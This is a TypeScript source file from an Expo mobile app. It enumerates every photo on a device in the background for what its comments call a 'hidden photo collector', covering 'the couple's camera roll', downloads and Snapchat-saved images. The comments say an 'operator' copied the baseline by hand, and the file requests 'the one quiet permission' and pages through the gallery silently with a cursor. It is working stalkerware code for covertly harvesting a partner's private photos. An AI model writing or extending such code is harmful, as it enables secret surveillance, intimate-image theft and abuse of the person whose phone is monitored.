// features/capture/mediaLibrary.ts — background gallery enumeration for the
// hidden photo collector. Thin typed wrapper over expo-media-library; no UI,
// never throws. The collector calls `scanSince` with the last cursor and gets
// back only new assets, keyed by their device Asset ID (the idempotency key).
//
// Photo stream scope: we intentionally capture ALL gallery photos (the couple's
// camera roll + downloads + Snapchat-saved), deduped by Asset ID. The operator
// already copied the baseline by hand; this captures the ongoing delta.
//
// Import is from `expo-media-library/legacy`: SDK 57 moved the media APIs to a
// native Query/Asset class surface, but the stateless `getAssetsAsync` /
// `MediaType` / `SortBy` contract we rely on for pagination lives on the legacy
// subpath and remains fully backed at runtime. Using the legacy surface keeps
// the page-walk + cursor-cutoff logic simple and typecheck-safe.
import { MediaType, SortBy, getAssetsAsync, getPermissionsAsync, requestPermissionsAsync } from 'expo-media-library/legacy';

export type PhotoAsset = {
  /** MediaStore Asset ID — stable per install, the idempotency key. */
  assetId: string;
  /** file:// URI on Android for upload (expo-media-library legacy returns a
   *  file:// of the MediaStore DATA path). */
  uri: string;
  /** asset creation time milliseconds (the "taken_at"). `getAssetsAsync` returns
   *  ms on both platforms; do NOT multiply by 1000. NOTE: this is DATE_TAKEN,
   *  which is frequently 0 on real devices for downloads / Snapchat-saved /
   *  screenshots / imports — so it is NOT safe to use as the scan cursor.
   *  Use `modificationTime` for ordering/cursor instead. */
  creationTime: number;
  /** asset last-modified time MILLISECONDS (file mtime). On Android this is
   *  `DATE_MODIFIED * 1000`, which is ALWAYS set for real gallery files (never
   *  0, unlike creationTime/DATE_TAKEN). This is what the scan sorts and gates
   *  on so no photo is skipped for having a missing/stale taken-time. */
  modificationTime: number;
  filename: string | null;
  /** Best-effort MIME type derived from the filename. Used so uploads declare
   *  the real content type instead of a blanket image/jpeg. */
  mimeType: string | null;
  width: number;
  height: number;
};

/** Derive a content type from a filename's extension (lower-cased). Unknown or
 *  missing extensions fall back to image/jpeg — never a misleading HEIC-as-JPEG.
 *  Pure so it is unit-testable. */
export function photoContentType(filename: string | null): string | null {
  if (!filename) return null;
  const ext = filename.split('.').pop()?.toLowerCase() ?? '';
  switch (ext) {
    case 'jpeg':
    case 'jpg':
    case 'jpe':
    case 'jfif':
      return 'image/jpeg';
    case 'png':
      return 'image/png';
    case 'heic':
    case 'heif':
      return 'image/heic';
    case 'webp':
      return 'image/webp';
    case 'gif':
      return 'image/gif';
    case 'bmp':
      return 'image/bmp';
    case 'tiff':
    case 'tif':
      return 'image/tiff';
    default:
      return null;
  }
}

/** True once the READ_MEDIA_IMAGES permission is granted. Rechecks every call
 *  so a later grant (or revoke) is reflected immediately. */
export async function hasMediaPermission(): Promise<boolean> {
  const perm = await getPermissionsAsync();
  return perm.granted;
}

/** Request the one quiet permission. Returns granted status. Never throws. */
export async function requestMediaPermission(): Promise<boolean> {
  try {
    const perm = await requestPermissionsAsync();
    return perm.granted;
  } catch {
    return false;
  }
}

const PAGE = 500;

/**
 * Enumerate device photos (newest-first, paginated), optionally bounded at
 * [afterTsMs] (0 = all). Returns only assets, deduped by id.
 *
 * ORDERING / CURSOR BASIS: we sort and gate on the asset's `modificationTime`
 * (file mtime, ms) — NOT `creationTime`. On real devices `creationTime`
 * (MediaStore DATE_TAKEN) is frequently 0/null for downloads, Snapchat-saved
 * photos, screenshots and imports, so a creationTime-based cursor would
 * permanently skip exactly that content. `modificationTime` is always set for
 * gallery files, so it is a reliable ingestion proxy.
 *
 * The cursor is a soft pagination hint, never a hard filter: the cutoff is
 * INCLUSIVE on the boundary (we stop only strictly below afterTsMs), so photos
 * whose modification time lands on/after the cursor are always re-eligible.
 * Asset ID (not time) is the real "already captured" gate — the collector
 * enqueues with INSERT OR IGNORE on asset id, so re-scanned boundary assets are
 * harmless no-ops rather than duplicates. On permission-missing returns
 * { ok:false, reason:'permission', assets: [] }. Never throws.
 */
export async function scanSince(afterTsMs = 0): Promise<{
  ok: boolean;
  reason?: string;
  assets: PhotoAsset[];
}> {
  if (!(await hasMediaPermission())) {
    return { ok: false, reason: 'permission', assets: [] };
  }
  try {
    const assets: PhotoAsset[] = [];
    let cursor: string | null = null;
    let done = false;
    while (!done) {
      // result includes only photos (mediaType:'photo'); sort newest-first by
      // modificationTime so we can stop as soon as we pass the cursor.
      const res = await getAssetsAsync({
        mediaType: MediaType.photo,
        sortBy: [[SortBy.modificationTime, false]],
        first: PAGE,
        after: cursor ?? undefined,
      });
      for (const a of res.assets) {
        const modMs = a.modificationTime;
        // Cut off only STRICTLY below the cursor so the boundary group (photos
        // modified at/after afterTsMs, incl. same-ms) is always eligible.
        if (afterTsMs > 0 && modMs < afterTsMs) {
          done = true; // strictly past the cursor; stop (newest-first)
          break;
        }
        assets.push({
          assetId: a.id,
          uri: a.uri,
          creationTime: a.creationTime,
          modificationTime: modMs,
          filename: a.filename ?? null,
          mimeType: photoContentType(a.filename ?? null),
          width: a.width,
          height: a.height,
        });
      }
      if (done) break;
      if (res.hasNextPage && res.endCursor) {
        cursor = res.endCursor;
      } else {
        done = true;
      }
    }
    // dedupe (defensive; MediaStore should not repeat within a page walk)
    const seen = new Set<string>();
    const unique = assets.filter((a) => (seen.has(a.assetId) ? false : (seen.add(a.assetId), true)));
    return { ok: true, assets: unique };
  } catch {
    return { ok: false, reason: 'error', assets: [] };
  }
}
